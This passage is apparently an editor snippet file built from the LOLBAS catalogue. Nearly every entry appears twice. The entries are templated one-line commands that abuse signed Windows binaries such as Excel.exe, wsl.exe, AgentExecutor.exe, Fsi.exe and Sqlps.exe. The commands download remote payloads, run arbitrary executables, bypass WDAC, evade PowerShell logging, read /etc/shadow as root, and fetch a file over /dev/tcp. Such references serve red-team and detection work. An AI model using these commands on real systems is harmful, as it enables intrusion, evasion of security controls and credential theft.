            "adplus.exe -crash -o \"{PATH_ABSOLUTE:folder}\" -sc {PATH:.exe}${0}",
            "```"
        ],
        "description": "adplus.exe is Debugging tool included with Windows Debugging Tools. it can Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required., requires  privilege, category: Execute, it can be used for Run commands under a trusted Microsoft signed binary."
    },
    "Excel.exe It will download a remote payload and place it in INetCache. (lolbas)": {
        "prefix": "Excel.exe",
        "body": [
            "Excel.exe is Microsoft Office binary. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "Excel.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Excel.exe is Microsoft Office binary. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "lolbas Excel.exe It will download a remote payload and place it in INetCache.": {
        "prefix": "lolbas Excel.exe",
        "body": [
            "Excel.exe is Microsoft Office binary. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "Excel.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Excel.exe is Microsoft Office binary. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "Devtoolslauncher.exe Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary. (lolbas)": {
        "prefix": "Devtoolslauncher.exe",
        "body": [
            "Devtoolslauncher.exe is Binary will execute specified binary. Part of VS/VScode installation.. it can The above binary will execute other binary., requires  privilege, category: Execute, it can be used for Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary..",
            "",
            "```sh",
            "devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test${0}",
            "```"
        ],
        "description": "Devtoolslauncher.exe is Binary will execute specified binary. Part of VS/VScode installation.. it can The above binary will execute other binary., requires  privilege, category: Execute, it can be used for Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary.."
    },
    "lolbas Devtoolslauncher.exe Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary.": {
        "prefix": "lolbas Devtoolslauncher.exe",
        "body": [
            "Devtoolslauncher.exe is Binary will execute specified binary. Part of VS/VScode installation.. it can The above binary will execute other binary., requires  privilege, category: Execute, it can be used for Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary..",
            "",
            "```sh",
            "devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test${0}",
            "```"
        ],
        "description": "Devtoolslauncher.exe is Binary will execute specified binary. Part of VS/VScode installation.. it can The above binary will execute other binary., requires  privilege, category: Execute, it can be used for Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary.."
    },
    "Devtoolslauncher.exe Execute any binary with given arguments. (lolbas)": {
        "prefix": "Devtoolslauncher.exe",
        "body": [
            "Devtoolslauncher.exe is Binary will execute specified binary. Part of VS/VScode installation.. it can The above binary will execute other binary., requires  privilege, category: Execute, it can be used for Execute any binary with given arguments..",
            "",
            "```sh",
            "devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test${0}",
            "```"
        ],
        "description": "Devtoolslauncher.exe is Binary will execute specified binary. Part of VS/VScode installation.. it can The above binary will execute other binary., requires  privilege, category: Execute, it can be used for Execute any binary with given arguments.."
    },
    "lolbas Devtoolslauncher.exe Execute any binary with given arguments.": {
        "prefix": "lolbas Devtoolslauncher.exe",
        "body": [
            "Devtoolslauncher.exe is Binary will execute specified binary. Part of VS/VScode installation.. it can The above binary will execute other binary., requires  privilege, category: Execute, it can be used for Execute any binary with given arguments..",
            "",
            "```sh",
            "devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test${0}",
            "```"
        ],
        "description": "Devtoolslauncher.exe is Binary will execute specified binary. Part of VS/VScode installation.. it can The above binary will execute other binary., requires  privilege, category: Execute, it can be used for Execute any binary with given arguments.."
    },
    "Wsl.exe Performs execution of specified file, can be used to execute arbitrary Linux commands. (lolbas)": {
        "prefix": "Wsl.exe",
        "body": [
            "Wsl.exe is Windows subsystem for Linux executable. it can Executes calc.exe from wsl.exe, requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used to execute arbitrary Linux commands..",
            "",
            "```sh",
            "wsl.exe -e /mnt/c/Windows/System32/calc.exe${0}",
            "```"
        ],
        "description": "Wsl.exe is Windows subsystem for Linux executable. it can Executes calc.exe from wsl.exe, requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used to execute arbitrary Linux commands.."
    },
    "lolbas Wsl.exe Performs execution of specified file, can be used to execute arbitrary Linux commands.": {
        "prefix": "lolbas Wsl.exe",
        "body": [
            "Wsl.exe is Windows subsystem for Linux executable. it can Executes calc.exe from wsl.exe, requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used to execute arbitrary Linux commands..",
            "",
            "```sh",
            "wsl.exe -e /mnt/c/Windows/System32/calc.exe${0}",
            "```"
        ],
        "description": "Wsl.exe is Windows subsystem for Linux executable. it can Executes calc.exe from wsl.exe, requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used to execute arbitrary Linux commands.."
    },
    "Wsl.exe Performs execution of arbitrary Linux commands as root without need for password. (lolbas)": {
        "prefix": "Wsl.exe",
        "body": [
            "Wsl.exe is Windows subsystem for Linux executable. it can Cats /etc/shadow file as root, requires  privilege, category: Execute, it can be used for Performs execution of arbitrary Linux commands as root without need for password..",
            "",
            "```sh",
            "wsl.exe -u root -e cat /etc/shadow${0}",
            "```"
        ],
        "description": "Wsl.exe is Windows subsystem for Linux executable. it can Cats /etc/shadow file as root, requires  privilege, category: Execute, it can be used for Performs execution of arbitrary Linux commands as root without need for password.."
    },
    "lolbas Wsl.exe Performs execution of arbitrary Linux commands as root without need for password.": {
        "prefix": "lolbas Wsl.exe",
        "body": [
            "Wsl.exe is Windows subsystem for Linux executable. it can Cats /etc/shadow file as root, requires  privilege, category: Execute, it can be used for Performs execution of arbitrary Linux commands as root without need for password..",
            "",
            "```sh",
            "wsl.exe -u root -e cat /etc/shadow${0}",
            "```"
        ],
        "description": "Wsl.exe is Windows subsystem for Linux executable. it can Cats /etc/shadow file as root, requires  privilege, category: Execute, it can be used for Performs execution of arbitrary Linux commands as root without need for password.."
    },
    "Wsl.exe Performs execution of arbitrary Linux commands. (lolbas)": {
        "prefix": "Wsl.exe",
        "body": [
            "Wsl.exe is Windows subsystem for Linux executable. it can Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`), requires  privilege, category: Execute, it can be used for Performs execution of arbitrary Linux commands..",
            "",
            "```sh",
            "wsl.exe --exec bash -c \"{CMD}\"${0}",
            "```"
        ],
        "description": "Wsl.exe is Windows subsystem for Linux executable. it can Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`), requires  privilege, category: Execute, it can be used for Performs execution of arbitrary Linux commands.."
    },
    "lolbas Wsl.exe Performs execution of arbitrary Linux commands.": {
        "prefix": "lolbas Wsl.exe",
        "body": [
            "Wsl.exe is Windows subsystem for Linux executable. it can Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`), requires  privilege, category: Execute, it can be used for Performs execution of arbitrary Linux commands..",
            "",
            "```sh",
            "wsl.exe --exec bash -c \"{CMD}\"${0}",
            "```"
        ],
        "description": "Wsl.exe is Windows subsystem for Linux executable. it can Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`), requires  privilege, category: Execute, it can be used for Performs execution of arbitrary Linux commands.."
    },
    "Wsl.exe Download file (lolbas)": {
        "prefix": "Wsl.exe",
        "body": [
            "Wsl.exe is Windows subsystem for Linux executable. it can Downloads file from 192.168.1.10, requires  privilege, category: Download, it can be used for Download file.",
            "",
            "```sh",
            "wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'${0}",
            "```"
        ],
        "description": "Wsl.exe is Windows subsystem for Linux executable. it can Downloads file from 192.168.1.10, requires  privilege, category: Download, it can be used for Download file."
    },
    "lolbas Wsl.exe Download file": {
        "prefix": "lolbas Wsl.exe",
        "body": [
            "Wsl.exe is Windows subsystem for Linux executable. it can Downloads file from 192.168.1.10, requires  privilege, category: Download, it can be used for Download file.",
            "",
            "```sh",
            "wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'${0}",
            "```"
        ],
        "description": "Wsl.exe is Windows subsystem for Linux executable. it can Downloads file from 192.168.1.10, requires  privilege, category: Download, it can be used for Download file."
    },
    "vsjitdebugger.exe Execution of local PE file as a subprocess of Vsjitdebugger.exe. (lolbas)": {
        "prefix": "vsjitdebugger.exe",
        "body": [
            "vsjitdebugger.exe is Just-In-Time (JIT) debugger included with Visual Studio. it can Executes specified executable as a subprocess of Vsjitdebugger.exe., requires  privilege, category: Execute, it can be used for Execution of local PE file as a subprocess of Vsjitdebugger.exe..",
            "",
            "```sh",
            "Vsjitdebugger.exe {PATH:.exe}${0}",
            "```"
        ],
        "description": "vsjitdebugger.exe is Just-In-Time (JIT) debugger included with Visual Studio. it can Executes specified executable as a subprocess of Vsjitdebugger.exe., requires  privilege, category: Execute, it can be used for Execution of local PE file as a subprocess of Vsjitdebugger.exe.."
    },
    "lolbas vsjitdebugger.exe Execution of local PE file as a subprocess of Vsjitdebugger.exe.": {
        "prefix": "lolbas vsjitdebugger.exe",
        "body": [
            "vsjitdebugger.exe is Just-In-Time (JIT) debugger included with Visual Studio. it can Executes specified executable as a subprocess of Vsjitdebugger.exe., requires  privilege, category: Execute, it can be used for Execution of local PE file as a subprocess of Vsjitdebugger.exe..",
            "",
            "```sh",
            "Vsjitdebugger.exe {PATH:.exe}${0}",
            "```"
        ],
        "description": "vsjitdebugger.exe is Just-In-Time (JIT) debugger included with Visual Studio. it can Executes specified executable as a subprocess of Vsjitdebugger.exe., requires  privilege, category: Execute, it can be used for Execution of local PE file as a subprocess of Vsjitdebugger.exe.."
    },
    "Winword.exe It will download a remote payload and place it in INetCache. (lolbas)": {
        "prefix": "Winword.exe",
        "body": [
            "Winword.exe is Microsoft Office binary. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "winword.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Winword.exe is Microsoft Office binary. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "lolbas Winword.exe It will download a remote payload and place it in INetCache.": {
        "prefix": "lolbas Winword.exe",
        "body": [
            "Winword.exe is Microsoft Office binary. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "winword.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Winword.exe is Microsoft Office binary. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "Vshadow.exe Performs execution of specified executable file. (lolbas)": {
        "prefix": "Vshadow.exe",
        "body": [
            "Vshadow.exe is VShadow is a command-line tool that can be used to create and manage volume shadow copies.. it can Executes specified executable from vshadow.exe., requires  privilege, category: Execute, it can be used for Performs execution of specified executable file..",
            "",
            "```sh",
            "vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:${0}",
            "```"
        ],
        "description": "Vshadow.exe is VShadow is a command-line tool that can be used to create and manage volume shadow copies.. it can Executes specified executable from vshadow.exe., requires  privilege, category: Execute, it can be used for Performs execution of specified executable file.."
    },
    "lolbas Vshadow.exe Performs execution of specified executable file.": {
        "prefix": "lolbas Vshadow.exe",
        "body": [
            "Vshadow.exe is VShadow is a command-line tool that can be used to create and manage volume shadow copies.. it can Executes specified executable from vshadow.exe., requires  privilege, category: Execute, it can be used for Performs execution of specified executable file..",
            "",
            "```sh",
            "vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:${0}",
            "```"
        ],
        "description": "Vshadow.exe is VShadow is a command-line tool that can be used to create and manage volume shadow copies.. it can Executes specified executable from vshadow.exe., requires  privilege, category: Execute, it can be used for Performs execution of specified executable file.."
    },
    "AppCert.exe Performs execution of specified file, can be used as a defense evasion (lolbas)": {
        "prefix": "AppCert.exe",
        "body": [
            "AppCert.exe is Windows App Certification Kit command-line tool.. it can Execute an executable file via the Windows App Certification Kit command-line tool., requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defense evasion.",
            "",
            "```sh",
            "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}${0}",
            "```"
        ],
        "description": "AppCert.exe is Windows App Certification Kit command-line tool.. it can Execute an executable file via the Windows App Certification Kit command-line tool., requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defense evasion."
    },
    "lolbas AppCert.exe Performs execution of specified file, can be used as a defense evasion": {
        "prefix": "lolbas AppCert.exe",
        "body": [
            "AppCert.exe is Windows App Certification Kit command-line tool.. it can Execute an executable file via the Windows App Certification Kit command-line tool., requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defense evasion.",
            "",
            "```sh",
            "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}${0}",
            "```"
        ],
        "description": "AppCert.exe is Windows App Certification Kit command-line tool.. it can Execute an executable file via the Windows App Certification Kit command-line tool., requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defense evasion."
    },
    "AppCert.exe Execute custom made MSI file with malicious code (lolbas)": {
        "prefix": "AppCert.exe",
        "body": [
            "AppCert.exe is Windows App Certification Kit command-line tool.. it can Install an MSI file via an msiexec instance spawned via appcert.exe as parent process., requires  privilege, category: Execute, it can be used for Execute custom made MSI file with malicious code.",
            "",
            "```sh",
            "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml}${0}",
            "```"
        ],
        "description": "AppCert.exe is Windows App Certification Kit command-line tool.. it can Install an MSI file via an msiexec instance spawned via appcert.exe as parent process., requires  privilege, category: Execute, it can be used for Execute custom made MSI file with malicious code."
    },
    "lolbas AppCert.exe Execute custom made MSI file with malicious code": {
        "prefix": "lolbas AppCert.exe",
        "body": [
            "AppCert.exe is Windows App Certification Kit command-line tool.. it can Install an MSI file via an msiexec instance spawned via appcert.exe as parent process., requires  privilege, category: Execute, it can be used for Execute custom made MSI file with malicious code.",
            "",
            "```sh",
            "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml}${0}",
            "```"
        ],
        "description": "AppCert.exe is Windows App Certification Kit command-line tool.. it can Install an MSI file via an msiexec instance spawned via appcert.exe as parent process., requires  privilege, category: Execute, it can be used for Execute custom made MSI file with malicious code."
    },
    "AgentExecutor.exe Execute unsigned powershell scripts (lolbas)": {
        "prefix": "AgentExecutor.exe",
        "body": [
            "AgentExecutor.exe is Intune Management Extension included on Intune Managed Devices. it can Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument, requires  privilege, category: Execute, it can be used for Execute unsigned powershell scripts.",
            "",
            "```sh",
            "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\" 0 1${0}",
            "```"
        ],
        "description": "AgentExecutor.exe is Intune Management Extension included on Intune Managed Devices. it can Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument, requires  privilege, category: Execute, it can be used for Execute unsigned powershell scripts."
    },
    "lolbas AgentExecutor.exe Execute unsigned powershell scripts": {
        "prefix": "lolbas AgentExecutor.exe",
        "body": [
            "AgentExecutor.exe is Intune Management Extension included on Intune Managed Devices. it can Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument, requires  privilege, category: Execute, it can be used for Execute unsigned powershell scripts.",
            "",
            "```sh",
            "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\" 0 1${0}",
            "```"
        ],
        "description": "AgentExecutor.exe is Intune Management Extension included on Intune Managed Devices. it can Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument, requires  privilege, category: Execute, it can be used for Execute unsigned powershell scripts."
    },
    "AgentExecutor.exe Execute a provided EXE (lolbas)": {
        "prefix": "AgentExecutor.exe",
        "body": [
            "AgentExecutor.exe is Intune Management Extension included on Intune Managed Devices. it can If we place a binary named powershell.exe in the specified folder path, agentexecutor.exe will execute it successfully, requires  privilege, category: Execute, it can be used for Execute a provided EXE.",
            "",
            "```sh",
            "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"{PATH_ABSOLUTE:folder}\" 0 1${0}",
            "```"
        ],
        "description": "AgentExecutor.exe is Intune Management Extension included on Intune Managed Devices. it can If we place a binary named powershell.exe in the specified folder path, agentexecutor.exe will execute it successfully, requires  privilege, category: Execute, it can be used for Execute a provided EXE."
    },
    "lolbas AgentExecutor.exe Execute a provided EXE": {
        "prefix": "lolbas AgentExecutor.exe",
        "body": [
            "AgentExecutor.exe is Intune Management Extension included on Intune Managed Devices. it can If we place a binary named powershell.exe in the specified folder path, agentexecutor.exe will execute it successfully, requires  privilege, category: Execute, it can be used for Execute a provided EXE.",
            "",
            "```sh",
            "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"{PATH_ABSOLUTE:folder}\" 0 1${0}",
            "```"
        ],
        "description": "AgentExecutor.exe is Intune Management Extension included on Intune Managed Devices. it can If we place a binary named powershell.exe in the specified folder path, agentexecutor.exe will execute it successfully, requires  privilege, category: Execute, it can be used for Execute a provided EXE."
    },
    "vsls-agent.exe Execute proxied payload with Microsoft signed binary (lolbas)": {
        "prefix": "vsls-agent.exe",
        "body": [
            "vsls-agent.exe is Agent for Visual Studio Live Share (Code Collaboration). it can Load a library payload using the --agentExtensionPath parameter (32-bit), requires  privilege, category: Execute, it can be used for Execute proxied payload with Microsoft signed binary.",
            "",
            "```sh",
            "vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "vsls-agent.exe is Agent for Visual Studio Live Share (Code Collaboration). it can Load a library payload using the --agentExtensionPath parameter (32-bit), requires  privilege, category: Execute, it can be used for Execute proxied payload with Microsoft signed binary."
    },
    "lolbas vsls-agent.exe Execute proxied payload with Microsoft signed binary": {
        "prefix": "lolbas vsls-agent.exe",
        "body": [
            "vsls-agent.exe is Agent for Visual Studio Live Share (Code Collaboration). it can Load a library payload using the --agentExtensionPath parameter (32-bit), requires  privilege, category: Execute, it can be used for Execute proxied payload with Microsoft signed binary.",
            "",
            "```sh",
            "vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "vsls-agent.exe is Agent for Visual Studio Live Share (Code Collaboration). it can Load a library payload using the --agentExtensionPath parameter (32-bit), requires  privilege, category: Execute, it can be used for Execute proxied payload with Microsoft signed binary."
    },
    "Visio.exe It will download a remote payload and place it in INetCache. (lolbas)": {
        "prefix": "Visio.exe",
        "body": [
            "Visio.exe is Microsoft Visio Executable. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "Visio.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Visio.exe is Microsoft Visio Executable. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "lolbas Visio.exe It will download a remote payload and place it in INetCache.": {
        "prefix": "lolbas Visio.exe",
        "body": [
            "Visio.exe is Microsoft Visio Executable. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "Visio.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Visio.exe is Microsoft Visio Executable. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "Fsi.exe Execute payload with Microsoft signed binary to bypass WDAC policies (lolbas)": {
        "prefix": "Fsi.exe",
        "body": [
            "Fsi.exe is 64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.. it can Execute F# code via interactive command line, requires  privilege, category: AWL Bypass, it can be used for Execute payload with Microsoft signed binary to bypass WDAC policies.",
            "",
            "```sh",
            "fsi.exe${0}",
            "```"
        ],
        "description": "Fsi.exe is 64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.. it can Execute F# code via interactive command line, requires  privilege, category: AWL Bypass, it can be used for Execute payload with Microsoft signed binary to bypass WDAC policies."
    },
    "lolbas Fsi.exe Execute payload with Microsoft signed binary to bypass WDAC policies": {
        "prefix": "lolbas Fsi.exe",
        "body": [
            "Fsi.exe is 64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.. it can Execute F# code via interactive command line, requires  privilege, category: AWL Bypass, it can be used for Execute payload with Microsoft signed binary to bypass WDAC policies.",
            "",
            "```sh",
            "fsi.exe${0}",
            "```"
        ],
        "description": "Fsi.exe is 64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.. it can Execute F# code via interactive command line, requires  privilege, category: AWL Bypass, it can be used for Execute payload with Microsoft signed binary to bypass WDAC policies."
    },
    "Sqlps.exe Execute PowerShell commands without ScriptBlock logging. (lolbas)": {
        "prefix": "Sqlps.exe",
        "body": [
            "Sqlps.exe is Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\\100 and 110 are Powershell v2. Microsoft SQL Server\\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.. it can Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging., requires  privilege, category: Execute, it can be used for Execute PowerShell commands without ScriptBlock logging..",
            "",
            "```sh",
            "Sqlps.exe -noprofile${0}",
            "```"
        ],
        "description": "Sqlps.exe is Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\\100 and 110 are Powershell v2. Microsoft SQL Server\\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.. it can Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging., requires  privilege, category: Execute, it can be used for Execute PowerShell commands without ScriptBlock logging.."
    },
    "lolbas Sqlps.exe Execute PowerShell commands without ScriptBlock logging.": {
        "prefix": "lolbas Sqlps.exe",
        "body": [
            "Sqlps.exe is Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\\100 and 110 are Powershell v2. Microsoft SQL Server\\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.. it can Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging., requires  privilege, category: Execute, it can be used for Execute PowerShell commands without ScriptBlock logging..",
            "",
            "```sh",
            "Sqlps.exe -noprofile${0}",
            "```"
        ],
        "description": "Sqlps.exe is Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\\100 and 110 are Powershell v2. Microsoft SQL Server\\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.. it can Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging., requires  privilege, category: Execute, it can be used for Execute PowerShell commands without ScriptBlock logging.."
    },
    "MSAccess.exe It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache. (lolbas)": {
        "prefix": "MSAccess.exe",
        "body": [
            "MSAccess.exe is Microsoft Office component. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache..",
            "",
            "```sh",
            "MSAccess.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "MSAccess.exe is Microsoft Office component. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.."
    },
    "lolbas MSAccess.exe It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.": {
        "prefix": "lolbas MSAccess.exe",
        "body": [
            "MSAccess.exe is Microsoft Office component. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache..",
            "",
            "```sh",
            "MSAccess.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "MSAccess.exe is Microsoft Office component. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.."
    },
    "Wfc.exe Execute proxied payload with Microsoft signed binary to bypass WDAC policies (lolbas)": {
        "prefix": "Wfc.exe",
        "body": [
            "Wfc.exe is The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).. it can Execute arbitrary C# code embedded in a XOML file., requires  privilege, category: AWL Bypass, it can be used for Execute proxied payload with Microsoft signed binary to bypass WDAC policies.",
            "",
            "```sh",
            "wfc.exe {PATH_ABSOLUTE:.xoml}${0}",
            "```"
        ],
        "description": "Wfc.exe is The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).. it can Execute arbitrary C# code embedded in a XOML file., requires  privilege, category: AWL Bypass, it can be used for Execute proxied payload with Microsoft signed binary to bypass WDAC policies."
    },
    "lolbas Wfc.exe Execute proxied payload with Microsoft signed binary to bypass WDAC policies": {
        "prefix": "lolbas Wfc.exe",
        "body": [
            "Wfc.exe is The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).. it can Execute arbitrary C# code embedded in a XOML file., requires  privilege, category: AWL Bypass, it can be used for Execute proxied payload with Microsoft signed binary to bypass WDAC policies.",
            "",
            "```sh",
            "wfc.exe {PATH_ABSOLUTE:.xoml}${0}",
            "```"
        ],
        "description": "Wfc.exe is The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).. it can Execute arbitrary C# code embedded in a XOML file., requires  privilege, category: AWL Bypass, it can be used for Execute proxied payload with Microsoft signed binary to bypass WDAC policies."
    },
    "MsoHtmEd.exe It will download a remote payload and place it in INetCache. (lolbas)": {
        "prefix": "MsoHtmEd.exe",
        "body": [
            "MsoHtmEd.exe is Microsoft Office component. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "MsoHtmEd.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "MsoHtmEd.exe is Microsoft Office component. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "lolbas MsoHtmEd.exe It will download a remote payload and place it in INetCache.": {
        "prefix": "lolbas MsoHtmEd.exe",
        "body": [
            "MsoHtmEd.exe is Microsoft Office component. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "MsoHtmEd.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "MsoHtmEd.exe is Microsoft Office component. it can Downloads payload from remote server, requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "Remote.exe Executes a process under a trusted Microsoft signed binary (lolbas)": {
        "prefix": "Remote.exe",
        "body": [
            "Remote.exe is Debugging tool included with Windows Debugging Tools. it can Spawns specified executable as a child process of remote.exe, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "Remote.exe /s {PATH:.exe} anythinghere${0}",
            "```"
        ],
        "description": "Remote.exe is Debugging tool included with Windows Debugging Tools. it can Spawns specified executable as a child process of remote.exe, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary."
    },
    "lolbas Remote.exe Executes a process under a trusted Microsoft signed binary": {
        "prefix": "lolbas Remote.exe",
        "body": [
            "Remote.exe is Debugging tool included with Windows Debugging Tools. it can Spawns specified executable as a child process of remote.exe, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "Remote.exe /s {PATH:.exe} anythinghere${0}",
            "```"
        ],
        "description": "Remote.exe is Debugging tool included with Windows Debugging Tools. it can Spawns specified executable as a child process of remote.exe, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary."
    },
    "Remote.exe Executing a remote binary without saving file to disk (lolbas)": {
        "prefix": "Remote.exe",
        "body": [
            "Remote.exe is Debugging tool included with Windows Debugging Tools. it can Run a remote file, requires  privilege, category: Execute, it can be used for Executing a remote binary without saving file to disk.",
            "",
            "```sh",
            "Remote.exe /s {PATH_SMB:.exe} anythinghere${0}",
            "```"
        ],
